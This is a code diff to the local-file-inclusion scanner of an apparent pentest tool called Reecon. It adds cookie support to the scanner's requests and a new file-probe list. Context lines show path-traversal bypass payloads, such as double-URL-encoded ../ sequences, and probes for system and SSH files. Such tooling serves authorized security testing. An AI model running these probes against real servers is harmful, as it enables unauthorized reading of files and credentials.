@@ -15,13 +15,19 @@ namespace Reecon
         private static int notFoundLength2 = 0;
         private static int notFoundLength3 = 0;
         private static int bypassMethod = -1;
+        private static string cookie = null;
 
         public static void Scan(string[] args)
         {
-            if (args.Length != 2)
+            if (args.Length < 2)
             {
-                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file");
+                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file optCookieName=cookievalue");
                 return;
+            }
+            if (args.Length == 3)
+            {
+                Console.WriteLine("Setting cookie to: " + args[2]);
+                cookie = args[2];
             }
             ScanPath(args[1]);
         }
@@ -130,6 +136,14 @@ namespace Reecon
                 };
                 DoLFI(linux_ssh);
 
+                // Linux - Misc
+                List<string> linux_misc = new()
+                {
+                    "/etc/laurel/config.toml" // Tell if exists - Nothing super useful though
+                    // /var/log/laurel
+                };
+                DoLFI(linux_misc);
+
             }
             else if (OS == General.OS.Windows)
             {
@@ -155,7 +169,7 @@ namespace Reecon
             Console.WriteLine("Scanning: " + path);
 
             // First, check to make sure that the initial version works
-            HttpStatusCode statusCode = General.GetResponseCode(path);
+            HttpStatusCode statusCode = General.GetResponseCode(path, cookie);
             if (statusCode != HttpStatusCode.OK)
             {
                 Console.WriteLine(path + " is not an OK page :(");
@@ -170,7 +184,7 @@ namespace Reecon
             Console.WriteLine("Determining invalid path results...");
             
             // NFL1 - A regular invalid path
-            string result = Web.GetHTTPInfo(baseURL + "Reelix").PageText;
+            string result = Web.GetHTTPInfo(baseURL + "Reelix", cookie: cookie).PageText;
             notFoundLength = result.Length; // Check for cases where the page text contains the URL?
             // Some not-found pages can be blank
             if (notFoundLength < 0)
@@ -180,7 +194,7 @@ namespace Reecon
             Console.WriteLine("Invalid Path 1/3 Length: " + notFoundLength);
 
             // NFL2 - An invalid path with 2 dots
-            result = Web.GetHTTPInfo(baseURL + "Ree..lix").PageText;
+            result = Web.GetHTTPInfo(baseURL + "Ree..lix", cookie: cookie).PageText;
             notFoundLength2 = result.Length;
             if (notFoundLength2 < 0)
             {
@@ -189,7 +203,7 @@ namespace Reecon
             Console.WriteLine("Invalid Path 2/3 Length: " + notFoundLength2);
 
             // NFL3 - An invalid path, but the error message contains the path itself
-            result = Web.GetHTTPInfo(baseURL + "/some/file/name.txt").PageText;
+            result = Web.GetHTTPInfo(baseURL + "/some/file/name.txt", cookie: cookie).PageText;
             notFoundLength3 = result.Replace("/some/file/name.txt", "").Length;
             if (notFoundLength3 < 0)
             {
@@ -397,7 +411,7 @@ namespace Reecon
                 // Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{PATH})
                 if (bypassMethod == -1)
                 {
-                    Console.WriteLine($"Testing: Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{{PATH}} with {check}");
+                    Console.WriteLine($"Testing: Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{{PATH}}) with {check}");
                 }
                 if (bypassMethod == -1 || bypassMethod == 7)
                 {
@@ -418,7 +432,7 @@ namespace Reecon
         {
             try
             {
-                var requestResult = Web.GetHTTPInfo(fullPath, null);
+                var requestResult = Web.GetHTTPInfo(fullPath, cookie: cookie);
                 if (requestResult.AdditionalInfo == "Timeout")
                 {
                     Console.WriteLine("- " + fullPath + " -- Timeout :(");
